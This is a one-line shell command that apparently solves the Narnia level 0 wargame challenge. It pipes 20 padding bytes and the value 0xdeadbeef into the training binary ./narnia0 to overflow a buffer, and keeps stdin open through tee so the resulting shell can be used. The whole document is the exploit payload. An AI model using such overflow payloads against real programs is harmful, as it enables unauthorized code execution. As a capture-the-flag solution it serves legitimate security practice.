(python -c 'import sys,struct;sys.stdout.write("\x41"*(20) + struct.pack("<I", 0xdeadbeef))' 2> /dev/null; tee) | ./narnia0
